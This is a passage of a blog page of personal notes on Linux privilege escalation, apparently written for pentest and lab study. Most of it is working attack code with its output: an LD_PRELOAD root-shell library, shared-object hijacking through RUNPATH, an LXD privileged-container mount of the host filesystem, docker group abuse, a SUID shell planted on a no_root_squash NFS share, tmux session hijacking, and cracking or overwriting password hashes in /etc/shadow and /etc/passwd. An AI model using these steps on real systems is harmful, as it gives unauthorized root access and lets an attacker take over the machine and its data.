+<span class="gp">	libc.so.6 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f4185ebe000<span class="o">)</span>
+<span class="gp">	libpcre.so.3 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libpcre.so.3 <span class="o">(</span>0x00007f4185c4e000<span class="o">)</span>
+<span class="gp">	libdl.so.2 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libdl.so.2 <span class="o">(</span>0x00007f4185a4a000<span class="o">)</span>
+<span class="go">	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
+</span><span class="gp">	libpthread.so.0 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libpthread.so.0 <span class="o">(</span>0x00007f418582d000<span class="o">)</span>
+</pre></table></code></div></div><h2 id="ld_preload-privilege-escalation"><span class="mr-2">LD_PRELOAD Privilege Escalation</span><a href="#ld_preload-privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First, we need a user with sudo privileges.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> 
+<span class="go">
+</span><span class="c">...
+</span><span class="go">    (root) NOPASSWD: /usr/sbin/apache2 restart
+</span></pre></table></code></div></div><p>We can exploit the <strong>LD_PRELOAD</strong> issue to run a custom shared library file. Let’s compile the following library:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>
+<span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>Compile:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> root.so root.c <span class="nt">-nostartfiles</span>
+</pre></table></code></div></div><p>Now we can escalate privileges:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/root.so /usr/sbin/apache2 restart 
+<span class="go">
+id
+uid=0(root) gid=0(root) groups=0(root)
+</span></pre></table></code></div></div><hr /><h1 id="shared-object-hijacking">Shared Object Hijacking</h1><p>Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> payroll
+<span class="go">
+-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
+</span></pre></table></code></div></div><p>Check their libraries:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ldd payroll
+<span class="go">
+</span><span class="gp">linux-vdso.so.1 =&gt;</span><span class="w">  </span><span class="o">(</span>0x00007ffcb3133000<span class="o">)</span>
+<span class="gp">libshared.so =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libshared.so <span class="o">(</span>0x00007f7f62e51000<span class="o">)</span>
+<span class="gp">libc.so.6 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f7f62876000<span class="o">)</span>
+<span class="go">/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
+</span></pre></table></code></div></div><p>We see the non-standard library <code class="language-plaintext highlighter-rouge">libshared.so</code>. One such setting is the <strong>RUNPATH</strong> configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>readelf <span class="nt">-d</span> payroll  | <span class="nb">grep </span>PATH
+<span class="go">
+ 0x000000000000001d (RUNPATH)            Library runpath: [/development]
+</span></pre></table></code></div></div><p>We can see their location. Before compiling a library, we need to find the function name called by the binary.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cp</span> /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so 
+<span class="gp">zero@pio$</span><span class="w"> </span>ldd payroll
+<span class="go">
+linux-vdso.so.1 (0x00007ffd22bbc000)
+</span><span class="gp">libshared.so =&gt;</span><span class="w"> </span>/development/libshared.so <span class="o">(</span>0x00007f0c13112000<span class="o">)</span>
+<span class="go">/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000) 
+
+</span><span class="gp">zero@pio$</span><span class="w"> </span>./payroll 
+<span class="go">
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+</span></pre></table></code></div></div><p>Executing the binary throws an error stating that it failed to find the function named <code class="language-plaintext highlighter-rouge">dbquery</code>. We can compile a shared object which includes this function:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">dbquery</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Malicious library loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh -p"</span><span class="p">);</span>
+<span class="p">}</span> 
+</pre></table></code></div></div><p>Now compile and execute:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>cc src.c <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> /development/libshared.so 
+<span class="gp">zero@pio$</span><span class="w"> </span>./payroll 
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
+</span></pre></table></code></div></div><hr /><h1 id="privileged-groups">Privileged Groups</h1><h2 id="lxc--lxd"><span class="mr-2">LXC / LXD</span><a href="#lxc--lxd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>LXD</strong> is similar to Docker and is Ubuntu’s container manager. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at <code class="language-plaintext filepath highlighter-rouge">/mnt/root</code>. Let’s confirm group membership and use these rights to escalate to root:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">
+uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
+</span></pre></table></code></div></div><p>Unzip the Alpine image:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>unzip alpine.zip 
+<span class="go">
+Archive:  alpine.zip
+extracting: 64-bit Alpine/alpine.tar.gz  
+inflating: 64-bit Alpine/alpine.tar.gz.root  
+cd 64-bit\ Alpine/
+</span></pre></table></code></div></div><p>Start the <strong>LXD</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>lxd init
+</pre></table></code></div></div><p>Import the local image:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>lxc image import alpine.tar.gz alpine.tar.gz.root <span class="nt">--alias</span> alpine
+</pre></table></code></div></div><p>Start a privileged container with the <code class="language-plaintext highlighter-rouge">security.privileged</code> set to <code class="language-plaintext highlighter-rouge">true </code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>lxc init alpine r00t <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
+<span class="go">
+Creating r00t
+</span></pre></table></code></div></div><p>Mount the host file system:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>lxc config device add r00t mydev disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+<span class="go">
+Device mydev added to r00t
+</span></pre></table></code></div></div><p>And start:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>lxc start r00t 
+<span class="gp">zero@pio:~/64-bit Alpine$</span><span class="w"> </span>lxc <span class="nb">exec </span>r00t /bin/sh 
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span> 
+<span class="go">uid=0(root) gid=0(root)
+</span></pre></table></code></div></div><h2 id="docker"><span class="mr-2">Docker</span><a href="#docker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. For example <code class="language-plaintext highlighter-rouge">docker run -v /root:/mnt -it ubuntu</code>.</p><h2 id="disk"><span class="mr-2">Disk</span><a href="#disk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Users within the disk group have full access to any devices contained within <code class="language-plaintext filepath highlighter-rouge">/dev</code>, such as <code class="language-plaintext filepath highlighter-rouge">/dev/sda1</code>, which is typically the main device used by the operating system. An attacker with these privileges can use <code class="language-plaintext highlighter-rouge">debugfs</code> to access the entire file system with root level privileges.</p><h2 id="adm"><span class="mr-2">ADM</span><a href="#adm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Members of the adm group are able to read all logs stored in /var/log. Check it with:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">
+uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
+</span></pre></table></code></div></div><hr /><h1 id="miscellaneous-techniques">Miscellaneous Techniques</h1><h2 id="passive-traffic-capture"><span class="mr-2">Passive Traffic Capture</span><a href="#passive-traffic-capture" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Some tools like <a href="https://github.com/DanMcInerney/net-creds">net-creds</a> and <a href="https://github.com/lgandx/PCredz">PCredz</a> can be used to examine data being passed on the wire.</p><h2 id="weak-nfs-privileges"><span class="mr-2">Weak NFS Privileges</span><a href="#weak-nfs-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems.NFS uses TCP/UDP <strong>port 2049</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>showmount <span class="nt">-e</span> 10.129.2.12
+<span class="go">
+Export list for 10.129.2.12:
+/tmp             *
+/var/nfs/general *
+</span></pre></table></code></div></div><p>When an NFS volume is created, various options can be set:</p><div class="table-wrapper"><table><thead><tr><th><strong>Option</strong><th><strong>Description</strong><tbody><tr><td><code class="language-plaintext highlighter-rouge">root_squash</code><td>If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.<tr><td><code class="language-plaintext highlighter-rouge">no_root_squash</code><td>Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.</table></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cat</span> /etc/exports
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>/etc/exports: the access control list <span class="k">for </span>filesystems which may be exported
+<span class="gp">#</span><span class="w">		</span>to NFS clients.  See exports<span class="o">(</span>5<span class="o">)</span><span class="nb">.</span>
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>Example <span class="k">for </span>NFSv2 and NFSv3:
+<span class="gp">#</span><span class="w"> </span>/srv/homes       hostname1<span class="o">(</span>rw,sync,no_subtree_check<span class="o">)</span> hostname2<span class="o">(</span>ro,sync,no_subtree_check<span class="o">)</span>
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>Example <span class="k">for </span>NFSv4:
+<span class="gp">#</span><span class="w"> </span>/srv/nfs4        gss/krb5i<span class="o">(</span>rw,sync,fsid<span class="o">=</span>0,crossmnt,no_subtree_check<span class="o">)</span>
+<span class="gp">#</span><span class="w"> </span>/srv/nfs4/homes  gss/krb5i<span class="o">(</span>rw,sync,no_subtree_check<span class="o">)</span>
+<span class="gp">#</span><span class="w">
+</span><span class="go">/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+</span></pre></table></code></div></div><p>For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="n">htb</span><span class="err">@</span><span class="n">NIX02</span><span class="o">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">shell</span><span class="p">.</span><span class="n">c</span> 
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>Compile:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>gcc shell.c <span class="nt">-o</span> shell 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo </span>mount <span class="nt">-t</span> nfs 10.129.2.12:/tmp /mnt 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cp </span>shell /mnt 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">chmod </span>u+s /mnt/shell 
+<span class="gp">zero@pio$</span><span class="w"> </span>/tmp/shell 
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">
+uid=0(root) gid=0(root) groups=0(root)
+</span></pre></table></code></div></div><h2 id="hijacking-tmux-sessions"><span class="mr-2">Hijacking Tmux Sessions</span><a href="#hijacking-tmux-sessions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When not working in a tmux window, we can detach from the session, still leaving it active. For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>tmux <span class="nt">-S</span> /shareds new <span class="nt">-s</span> debugsess 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">chown </span>root:devs /shareds
+</pre></table></code></div></div><p>If we can compromise a user in the dev group, we can attach to this session and gain root access. Check for any running tmux processes:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ps aux | <span class="nb">grep </span>tmux 
+</pre></table></code></div></div><p>Check permissions:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /shareds 
+<span class="go">
+srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
+</span></pre></table></code></div></div><p>Review our group membership:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">
+uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
+</span></pre></table></code></div></div><p>Finally, attach to the tmux session:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>tmux <span class="nt">-S</span> /shareds
+<span class="go">
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+</span></pre></table></code></div></div><hr /><h1 id="files">Files</h1><h2 id="etcshadow"><span class="mr-2">/etc/shadow</span><a href="#etcshadow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If we can read the file <strong>/etc/shadow</strong> we can try to break the hashes with <strong>john</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</pre></table></code></div></div><p>If <strong>/etc/shadow</strong> is writeable we can change the passwords. First we need to generate one:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>mkpasswd <span class="nt">-m</span> <span class="nt">-sha-512</span> <span class="o">[</span>password]
+</pre></table></code></div></div><p>And then replace the hash.</p><h2 id="etcpasswd"><span class="mr-2">/etc/passwd</span><a href="#etcpasswd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If we can write in <strong>/etc/passwd</strong> we can change the password:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>openssl passwd <span class="o">[</span>password]
+</pre></table></code></div></div><p>Then we replace the <strong>x</strong> in the same line as the root with the hash, now we can log as root.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/system/'>System</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/privilage-escalation/" class="post-tag no-text-decoration" >privilage-escalation</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+Linux+Privilege+Escalation+-+Zeropio%27s+Blog&url=zeropio.github.io%2Fnotes%2Fsystem%2Flinux-privilege-escalation" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+Linux+Privilege+Escalation+-+Zeropio%27s+Blog&u=zeropio.github.io%2Fnotes%2Fsystem%2Flinux-privilege-escalation" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=zeropio.github.io%2Fnotes%2Fsystem%2Flinux-privilege-escalation&text=Notes+%7C+Linux+Privilege+Escalation+-+Zeropio%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/notes/vulnerabilities/xss">Notes | Cross Site Scripting</a><li><a href="/notes/tools/commands">Notes | Commands</a><li><a href="/notes/vulnerabilities/session-security">Notes | Session Security</a><li><a href="/notes/vulnerabilities/others">Notes | Others</a><li><a href="/notes/vulnerabilities/server-side-attacks">Notes | Server Side Attacks</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" 